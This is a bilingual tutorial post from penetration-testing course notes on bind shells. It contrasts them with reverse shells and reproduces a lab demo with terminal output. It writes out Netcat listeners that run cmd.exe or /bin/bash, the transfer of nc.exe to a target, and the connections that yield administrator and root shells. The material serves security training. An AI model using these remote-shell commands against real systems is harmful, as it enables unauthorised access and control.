---
layout: post
title: "Bind Shells"
date: "2023-04-16"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Bind Shells
## Bind Shells
A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system.

A Netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.

![Bind Shells](/img/in-post/ine/微信图片_20230415100239.png)

# 绑定Shells
## 绑定Shells
绑定 shell 是一种远程 shell，攻击者在其中直接连接到目标系统上的侦听器，从而允许在目标系统上执行命令。

Netcat 侦听器可以设置为在客户端连接到侦听器时执行特定的可执行文件，如 cmd.exe 或 /bin/bash。

![Bind Shells](/img/in-post/ine/微信图片_20230415100239.png)

# Demo: Bind Shells（演示：绑定 Shell）
What is a shell? A shell is a program or utility that allows you to execute commands on an operating system or a system for that matter. And a remote shell is just a shell that allows you to execute commands on a system. However, the remote shell allows you to do so remotely.

In order for a bind shell to be obtained, a Netcat listener must be configured on the target system. And that Netcat listener must be configured to execute a shell depending on the type of the operating system that's running on the target. Let's take a look at a simple example. If the target is running Windows, then the Netcat listener must be configured to execute a shell. And in the case of Windows, that will typically be cmd.exe or PowerShell.exe. What happens is once that Netcat listener is set up and configured to execute a shell, any Netcat client or any client for that matter that connects to that Netcat listener will be provided with a remote Command Prompt session or a command shell, or even a PowerShell session if PowerShell.exe has been configured to be executed.

The `-e` option allows you to execute a specific program. In the context of penetration testers or adversaries or attackers for that matter, the `-e` option is typically used to specify a shell. In the context of Windows, that will typically be cmd.exe or PowerShell.exe. If the target system is running Linux, then the Netcat listener must be configured to execute a shell. And on Linux, we have multiple shells. The default shell is `/bin/bash`, or you can use `/bin/sh`, which is the Bourne shell. You also have `/usr/bin/zsh` or zshell. And it's the same process. 

Reverse shells are much better than bind shells.

What's the problem from the perspective of an attacker? For one, we actually need to set up a Netcat listener on the target system. How do we do this if we don't even have access to the target system? That poses a potential issue. The second issue with bind shells comes from the perspective of network security. On most operating systems like Windows and Linux, inbound traffic that means traffic that's coming into a system will typically be blocked by the firewall or any other security systems or mechanisms that have been put in place, which means that, if Windows Firewall is enabled on a target system, a bind shell will probably fail if it's incoming to a port that has been blocked or a port range that has been blocked by Windows Firewall, for example. And this is where the whole idea of the reverse shell comes into play.

Let me just explain where a reverse shell is different, and it all comes down to the connection type. So in the context of a reverse shell, the roles are switched in that the target now connects to the attacker's Netcat listener. So a Netcat listener is set up on the attacker system, and then the target connects to that listener. This connection is then flipped and that is where you have a reverse shell. The reason for that is because outgoing traffic from a system is rarely blocked by a firewall or by any security mechanism, whereas inbound traffic is usually very suspect. If you open up a Windows system and just take a look at the inbound traffic currently it's going to be significantly less. And that's because there's very rarely a reason for there to be an incoming connection to a standard workstation system. If it's a server, then that's totally different. But even in that case, inbound traffic is usually limited and is controlled by a firewall, so only specific ports will be accepting inbound connections. That is the difference at a very high level between a bind shell and a reverse shell and why reverse shells are preferred to bind shells.

Target IP Address: 10.4.21.221

Kali Linux IP: 10.10.3.2

We're primarily focused on utilizing Netcat to set up bind shells and reverse shells.

The first step, that we need to perform is we need to transfer over nc.exe onto the Windows system.

I'll head over to the directory that contains nc.exe on the Kali Linux system.

```
cd /usr/share/windows-binaries
ls -al
```

Set up a web server with the Python module SimpleHTTPServer.

```
python -m SimpleHTTPServer 80
```

Head over to the Windows system. In order to transfer it, we can use the technique we used in the previous video where we downloaded it with a utility called certutil. 

```
http://10.10.3.2/
```

Download nc.exe.

```
C:\Users\Administrator>cd Downloads
C:\Users\Administrator\Downloads>dir
```

Let's assume that we are following the flow that is recommended by this lab where the Kali Linux system is the attacker and the target system is the system running Windows.

```
cd ~
```

In order to set up a bind shell, the target system needs to have a Netcat listener set up. And not only that, it needs to be configured to execute cmd.exe.

`-e prog`: inbound program to exec. 要执行的入站程序。

We'll set up a Netcat listener on the target system. However, because we want to obtain a bind shell and we want to be able to execute commands on the target system, we will execute cmd.exe. What this means is that, whenever a client connects to this particular listener, cmd.exe will be executed and the attacker system will be provided with a command shell or a Command Prompt session.

```
nc.exe -nvlp 1234 -e cmd.exe
```

We have set up the listener, so we'll head over to the attacker system.

If we want to connect to a particular target on a particular port.

`-nv`: no DNS resolution and verbose output.

```
nc -nv 10.4.21.221 1234
```

Netcat connected and the cmd.exe is executed and we have now gained access to the target system remotely via a bind shell.

```
C:\Users\Administrator\Downloads>whoami
```

We are currently the administrator user.

```
C:\Users\Administrator\Downloads>dir
```

What we've just done from a penetration tester's point of view is we have obtained remote access to the target system via a bind shell.

This can also be done both ways in that you can actually connect to a Linux system and obtain an bash shell or a Bourne shell if you wanted to.

We are just going to flip the roles now, so the Windows system is going to be the attacker system, and the Kali Linux system is going to be target system.

On a Linux target, you would need to set up a listener with Netcat. However, instead of saying execute, we can use `-c` option. `-c` to execute a shell. And then we specify the shell that we would like executed once a client connects.

nc -nvlp listen on port 1234 and execute the following shell. And this option is reserved for Linux system.

```
nc -nvlp 1234 -c /bin/bash
```

On the Windows system, we're connecting to the listener, 

```
C:\Users\Administrator\Downloads>nc.exe -nv 10.10.3.2 1234
```

It looks like we've obtained a bash session.

```
ls
```

And indeed, we have obtained remote access to the Linux system.

```
id
```

That is how to obtain remote access on a target system via a bind shell.

# 复现视频内容
Windows Server 2012 R2 : 10.0.24.157

Kali Linux : 10.10.21.3 

```
root@attackdefense:~# cd /usr/share/windows-binaries
root@attackdefense:/usr/share/windows-binaries# ls -al
total 1884
drwxr-xr-x  7 root root   4096 Feb 19  2020 .
drwxr-xr-x 16 root root   4096 Feb 19  2020 ..
drwxr-xr-x  2 root root   4096 Feb 19  2020 enumplus
-rwxr-xr-x  1 root root  53248 Jul 17  2019 exe2bat.exe
drwxr-xr-x  2 root root   4096 Feb 19  2020 fgdump
drwxr-xr-x  2 root root   4096 Feb 19  2020 fport
-rwxr-xr-x  1 root root  23552 Jul 17  2019 klogger.exe
drwxr-xr-x  2 root root   4096 Feb 19  2020 mbenum
drwxr-xr-x  4 root root   4096 Feb 19  2020 nbtenum
-rwxr-xr-x  1 root root  59392 Jul 17  2019 nc.exe
-rwxr-xr-x  1 root root 311296 Jul 17  2019 plink.exe
-rwxr-xr-x  1 root root 704512 Jul 17  2019 radmin.exe
-rwxr-xr-x  1 root root 364544 Jul 17  2019 vncviewer.exe
-rwxr-xr-x  1 root root 308736 Jul 17  2019 wget.exe
-rwxr-xr-x  1 root root  66560 Jul 17  2019 whoami.exe
root@attackdefense:/usr/share/windows-binaries# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

```

```
http://10.10.21.3/
```

```
root@attackdefense:/usr/share/windows-binaries# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.0.24.157 - - [16/Apr/2023 08:25:31] "GET / HTTP/1.1" 200 -
10.0.24.157 - - [16/Apr/2023 08:25:32] code 404, message File not found
10.0.24.157 - - [16/Apr/2023 08:25:32] "GET /favicon.ico HTTP/1.1" 404 -
10.0.24.157 - - [16/Apr/2023 08:25:43] "GET /nc.exe HTTP/1.1" 200 -
10.0.24.157 - - [16/Apr/2023 08:26:57] "GET / HTTP/1.1" 200 -
10.0.24.157 - - [16/Apr/2023 08:26:57] code 404, message File not found
10.0.24.157 - - [16/Apr/2023 08:26:57] "GET /favicon.ico HTTP/1.1" 404 -
10.0.24.157 - - [16/Apr/2023 08:26:59] "GET /nc.exe HTTP/1.1" 200 -

```

```
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Downloads

C:\Users\Administrator\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Users\Administrator\Downloads

04/16/2023  02:57 AM    <DIR>          .
04/16/2023  02:57 AM    <DIR>          ..
04/16/2023  02:57 AM            59,392 nc.exe
               1 File(s)         59,392 bytes
               2 Dir(s)   9,288,749,056 bytes free

```

```
C:\Users\Administrator\Downloads>nc.exe -nvlp 1234 -e cmd.exe
listening on [any] 1234 ...

```

```
root@attackdefense:/usr/share/windows-binaries# nc -nv 10.0.24.157 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.24.157:1234.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Downloads>whoami
whoami
win-omcnbkr66mn\administrator

C:\Users\Administrator\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Users\Administrator\Downloads

04/16/2023  02:57 AM    <DIR>          .
04/16/2023  02:57 AM    <DIR>          ..
04/16/2023  02:57 AM            59,392 nc.exe
               1 File(s)         59,392 bytes
               2 Dir(s)   9,288,757,248 bytes free
```

```
C:\Users\Administrator\Downloads>nc.exe -nvlp 1234 -e cmd.exe
listening on [any] 1234 ...
connect to [10.0.24.157] from (UNKNOWN) [10.10.21.3] 46968

```

```
-c, --sh-exec <command>    Executes the given command via /bin/sh
-c, --sh-exec <command> 通过 /bin/sh 执行给定的命令
```

```
root@attackdefense:/usr/share/windows-binaries# nc -nvlp 1234 -c /bin/bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
C:\Users\Administrator\Downloads>nc.exe -nv 10.10.21.3 1234
(UNKNOWN) [10.10.21.3] 1234 (?) open
ls
enumplus
exe2bat.exe
fgdump
fport
klogger.exe
mbenum
nbtenum
nc.exe
plink.exe
radmin.exe
vncviewer.exe
wget.exe
whoami.exe
pwd
/usr/share/windows-binaries
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

```

```
root@attackdefense:/usr/share/windows-binaries# nc -nvlp 1234 -c /bin/bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.24.157.
Ncat: Connection from 10.0.24.157:49326.

```